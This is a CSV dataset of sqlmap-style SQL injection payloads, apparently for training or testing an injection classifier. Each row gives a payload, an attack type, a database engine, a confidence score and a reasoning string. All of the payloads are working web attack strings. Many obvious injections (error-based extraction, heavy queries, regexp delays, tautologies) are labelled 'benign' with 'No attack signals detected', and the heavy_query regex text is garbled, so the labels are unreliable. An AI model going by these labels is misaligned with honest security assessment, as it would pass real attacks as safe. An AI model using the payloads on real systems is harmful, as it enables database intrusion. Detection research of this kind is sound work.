id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25354,"1' and elt ( 4249 = 4249,7259 ) and 'awjd' = 'awjd",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25355,"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25356,"select * from generate_series ( 4975,4975,case when ( 4975 = 9615 ) then 1 else 0 end ) limit 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25357,"1"" ) as tqxa where 6751 = 6751 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25358,"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25359,"1 ) as qyic where 9736 = 9736 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25360,"1%"" ) ) union all select null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25361,-2364' or 6743 = 7578,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25362,-8538%' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25363,"1%' ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( '%' = '",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25364,"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25365,end-- podi,unknown,generic,0.50,Insufficient information to classify,1
25366,"1%' and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25367,"1%"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
25368,"1"" ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""udlh"" = ""udlh",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25369,"1"" ) as nixg where 4580 = 4580 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25370,"1%' ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25371,"1"" where 6281 = 6281 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25372,"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""giuq"" = ""giuq",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25373,"1 ) ) union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25374,1' ) as jxtg where 1071 = 1071 and sleep ( 5 ) --,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25375,"1 where 5266 = 5266 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25376,"select count ( * ) from generate_series ( 1,5000000 ) and ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25377,"1%"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25378,"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'dbsm' = 'dbsm",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25379,"1' ) ) ) union all select null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25380,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25381,"1%' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( '%' = '",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25382,"-7851"" ) ) or 6872 = 6872 and ( ( ""dvbw"" like ""dvbw",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25383,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'zknl' = 'zknl",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25384,"-6928"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxhr"" like ""mxhr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25385,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'kjfm' = 'kjfm",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25386,select pg_sleep ( 5 ) ) +',time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25387,"1"" ) where 4382 = 4382 and 6607 = 2394--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25388,"1"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""krxy"" = ""krxy",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25389,"end and ""unqj"" = ""unqj",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25390,"-3368' ) ) union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25391,"1'|| ( select 'zdfo' from dual where 4288 = 4288 union all select null,null,null,null,null,null,null--",union_based,oracle,0.75,Signal match: union (all )?select → union_based (P7),1
25392,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ||'",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25393,"1"" ) where 5719 = 5719 rlike sleep ( 5 ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25394,1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'zhhf' like 'zhhf,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25395,"1%' and make_set ( 1227 = 5627,5627 ) and '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25396,"-3729' ) ) or elt ( 4482 = 2648,2648 ) and ( ( 'vkkr' like 'vkkr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25397,"( select concat ( 0x7171706a71, ( select ( elt ( 7381 = 7381,1 ) ) ) ,0x717a767a71 ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25398,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'egye' = 'egye",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25399,1' where 3028 = 3028,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25400,( select ( case when ( 4108 = 4108 ) then 1 else 4108* ( select 4108 from information_schema.character_sets ) end ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25401,"1"" ) ) as jikg where 8258 = 8258 and ( 3973 = 1047 ) *1047--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25402,"1 ) where 5464 = 5464 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25403,"1"" ) as wjdc where 8694 = 8694 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25404,"1 where 3737 = 3737 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25405,-4954' ) or 8571 = 8571--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25406,select ( case when ( 3773 = 3722 ) then 3773 else 3773* ( select 3773 from mysql.db ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25407,"1 ) where 3062 = 3062 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25408,"1' ) ) union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25409,"iif ( 1483 = 7301,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
25410,"1'|| ( select 'jonh' from dual where 2415 = 2415 union all select null,null,null,null,null,null,null,null,null--",union_based,oracle,0.75,Signal match: union (all )?select → union_based (P7),1
25411,"1%' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( '%' = '",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25412,1'|| ( select 'ilkr' from dual where 9296 = 9296,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25413,"1"" ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25414,"1"" ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""bizm"" = ""bizm",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25415,1' ) as mzby where 6530 = 6530,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25416,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'sqvt' like 'sqvt,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25417,"1"" ) ) as iqgd where 7611 = 7611 union all select null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25418,"1' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'zcey' = 'zcey",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25419,select case when 3995 = 8680 then 1 else null end--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25420,"1%"" ) ) ) rlike ( select ( case when ( 4442 = 4476 ) then 1 else 0x28 end ) ) and ( ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25421,"1'+ ( select 'ayod' where 7839 = 7839 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25422,"1 ) as ekgx where 9923 = 9923 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25423,-4239 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- xacp,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25424,1' where 5458 = 5458 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25425,"-5763' ) ) ) union all select 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25426,select ( case when ( 6652 = 1932 ) then 6652 else 6652* ( select 6652 from information_schema.character_sets ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25427,-4173' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'jdwt' like 'jdwt,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25428,"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'bemh' = 'bemh",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25429,"1%"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""%"" = """,error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25430,"1'+ ( select 'tzyz' where 4912 = 4912 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25431,"1 ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 1205 = 1205",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25432,"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25433,"1"" ) as kuuf where 6908 = 6908",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25434,-6661' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'tbmu' like 'tbmu,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25435,1' ) ) as wjfj where 3802 = 3802,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25436,"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""xsfg"" like ""xsfg",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25437,-2516 ) where 3349 = 3349 or 4855 = 1806--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25438,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25439,1' ) as xqbq where 1619 = 1619 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25440,"-2782"" union all select 2109,2109,2109#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25441,1' ) as irck where 3660 = 3660 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25442,"1"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25443,"1'+ ( select 'vedi' where 2774 = 2774 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25444,1' ) where 6408 = 6408,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25445,"1%' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
25446,"-3230"" ) ) as kbxc where 5007 = 5007 or 2107 = 8818",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25447,1' ) and ( 3020 = 3020 ) *6703 and ( 'lhfa' = 'lhfa,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25448,"1"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""aall"" like ""aall",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25449,1'|| ( select 'dyuw' from dual where 2037 = 2037,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25450,"-5181"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""qofp"" = ""qofp",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25451,"-2838"" where 5442 = 5442 union all select 5442#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25452,"1"" ) as lexx where 2892 = 2892 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25453,"1"" ) where 6072 = 6072 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25454,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'tpcm' like 'tpcm",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25455,"1' where 6905 = 6905 union all select null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25456,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'iwkg' = 'iwkg",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25457,"1"" and 4996 = 4431 and ""jzaq"" = ""jzaq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25458,"1' ) where 7007 = 7007 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25459,"1"" ) ) as czzg where 5483 = 5483 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25460,"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'lgcw' = 'lgcw",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25461,"1%' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25462,"1"" ) as cfed where 8220 = 8220 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25463,-8876' ) ) or 3038 = 3038,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25464,"-1593' or elt ( 7044 = 6125,6125 ) and 'zkuz' = 'zkuz",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25465,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'dubu' like 'dubu",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25466,"1' ) where 6388 = 6388 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25467,"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'lwyo' = 'lwyo",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25468,1 where 8532 = 8532,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25469,"-8790' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'nsze' like 'nsze",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25470,"-9023%"" ) ) ) union all select 4490,4490,4490#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25471,"1%"" and make_set ( 2905 = 5725,5725 ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25472,"1 ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 3023 = 3023",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25473,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""xbft"" = ""xbft",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25474,"1"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25475,"-4615' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'jipk' like 'jipk",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25476,"1"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""uqyb"" = ""uqyb",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
